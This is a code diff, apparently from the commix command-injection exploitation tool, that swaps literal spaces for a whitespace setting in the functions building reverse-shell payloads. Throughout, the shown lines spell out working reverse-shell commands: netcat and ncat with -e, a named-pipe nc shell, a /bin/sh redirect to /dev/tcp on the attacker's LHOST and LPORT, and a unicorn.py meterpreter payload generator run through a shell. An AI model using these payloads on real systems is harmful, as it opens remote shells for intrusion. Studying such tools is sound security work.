@@ -265,11 +265,11 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_AL
 
   if nc_version != '4':
     # Netcat with -e
-    cmd = nc_alternative + " " + settings.LHOST + " " + settings.LPORT + " -e " + shell
+    cmd = nc_alternative + settings.SINGLE_WHITESPACE + settings.LHOST + settings.SINGLE_WHITESPACE + settings.LPORT + " -e " + shell
   else:
     # nc without -e 
     cmd = shell + " -c \"" + shell + " 0</tmp/f | " + \
-           nc_alternative + " " + settings.LHOST + " " + settings.LPORT + \
+           nc_alternative + settings.SINGLE_WHITESPACE + settings.LHOST + settings.SINGLE_WHITESPACE + settings.LPORT + \
            " 1>/tmp/f\""
 
   return cmd
@@ -349,12 +349,12 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_other""" + Style.RESET_ALL
     elif other_shell == '6':
       tmp_file = ''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(5)])
       other_shell = "echo \"/bin/sh 0>/dev/tcp/"+ settings.LHOST + "/" + settings.LPORT + \
-                    " 1>%260 2>%260\" > /tmp/" + tmp_file + " " + separator + " /bin/bash /tmp/" + tmp_file
+                    " 1>%260 2>%260\" > /tmp/" + tmp_file + settings.SINGLE_WHITESPACE + separator + " /bin/bash /tmp/" + tmp_file
       break
 
     # Ncat-reverse-shell 
     elif other_shell == '7':
-      other_shell = "ncat " + settings.LHOST + " " + settings.LPORT + " -e /bin/sh"
+      other_shell = "ncat " + settings.LHOST + settings.SINGLE_WHITESPACE + settings.LPORT + " -e /bin/sh"
       break
 
     # Windows Python-reverse-shell
@@ -557,7 +557,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """windows_meterpreter_reverse_tcp""" + S
                   unicorn_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../', 'thirdparty/unicorn'))
                   os.chdir(unicorn_path)
                 gen_payload_msg(payload)
-                subprocess.Popen("python unicorn.py" + " " + str(payload) + " " + str(settings.LHOST) + " " + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
+                subprocess.Popen("python unicorn.py" + settings.SINGLE_WHITESPACE + str(payload) + settings.SINGLE_WHITESPACE + str(settings.LHOST) + settings.SINGLE_WHITESPACE + str(settings.LPORT) + ">/dev/null 2>&1", shell=True).wait()
                 with open(output, 'r') as content_file:
                   other_shell = content_file.read().replace('\n', '')
                 other_shell = _urllib.parse.quote_plus(other_shell) 
